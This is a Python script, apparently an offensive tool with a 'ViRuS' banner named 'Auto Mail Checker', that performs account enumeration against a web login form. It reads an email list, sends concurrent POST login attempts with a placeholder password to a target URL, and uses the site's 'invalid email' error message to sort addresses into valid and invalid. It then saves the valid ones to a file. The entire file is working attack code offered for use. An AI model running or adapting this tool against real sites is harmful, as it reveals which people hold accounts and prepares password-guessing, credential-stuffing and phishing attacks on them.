import os
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm


def show_banner():
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" < 
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  Auto Mail Checker
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)


def get_target_details():
    """
    Interactive input to get the target URL, headers, and error message.
    """
    print("\nEnter the details for the target:")
    url = input("Target URL (e.g., http://example.com/functions.php): ").strip()
    invalid_error = input("Error message for invalid emails (e.g., 'Email does not exist'): ").strip()

    headers = {
        'Host': input("Host header (e.g., example.com): ").strip(),
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': input("Origin header (e.g., http://example.com): ").strip(),
        'Connection': 'close',
        'Referer': input("Referer header (e.g., http://example.com/login): ").strip(),
    }

    return url, headers, invalid_error


def check_email(email, url, headers, invalid_error):
    """
    Sends a POST request to the target URL to check if an email exists.
    """
    data = {
        'username': email,
        'password': 'password',  # Placeholder password
        'function': 'login'
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an HTTPError for bad responses
        response_json = response.json()
        if 'status' in response_json and 'message' in response_json:
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                return email, False
            return email, True
        else:
            print(f"[WARNING] Unexpected response structure for {email}: {response.text}")
            return email, False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to check email {email}: {e}")
        return email, False


def enumerate_emails(email_file, url, headers, invalid_error):
    """
    Reads emails from a file, checks their validity concurrently, and displays a progress bar.
    """
    valid_emails = []

    try:
        with open(email_file, 'r') as file:
            emails = [email.strip() for email in file.readlines() if email.strip()]

        print(f"\nTotal emails to check: {len(emails)}\n")

        # Use ThreadPoolExecutor for concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_email = {executor.submit(check_email, email, url, headers, invalid_error): email for email in emails}
            
            # Use tqdm for a progress bar
            for future in tqdm(as_completed(future_to_email), total=len(emails), desc="Checking emails"):
                email, is_valid = future.result()
                if is_valid:
                    print(f"[VALID] {email}")
                    valid_emails.append(email)
                else:
                    print(f"[INVALID] {email}")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {email_file}")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")

    return valid_emails


def main():
    show_banner()

    choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()
    if choice == 'n':
        print("\nExiting the script. Goodbye!")
        return
    elif choice != 'y':
        print("\nInvalid choice. Exiting the script.")
        return

    # Clear the console
    os.system('clear' if os.name == 'posix' else 'cls')

    # Get the email file
    email_file = input("Enter the path to the email list file: ").strip()

    # Get target details interactively
    url, headers, invalid_error = get_target_details()

    # Enumerate emails
    print("\nStarting email enumeration...")
    valid_emails = enumerate_emails(email_file, url, headers, invalid_error)

    # Output valid emails
    print("\n=== Enumeration Complete ===")
    print("Valid emails found:")
    for valid_email in valid_emails:
        print(valid_email)

    # Save valid emails to a file
    output_file = input("\nEnter the output file name to save valid emails (e.g., valid_emails.txt): ").strip()
    try:
        with open(output_file, 'w') as file:
            file.write('\n'.join(valid_emails))
        print(f"\n[INFO] Valid emails saved to {output_file}")
    except Exception as e:
        print(f"[ERROR] Failed to save valid emails: {e}")


if __name__ == "__main__":
    main()
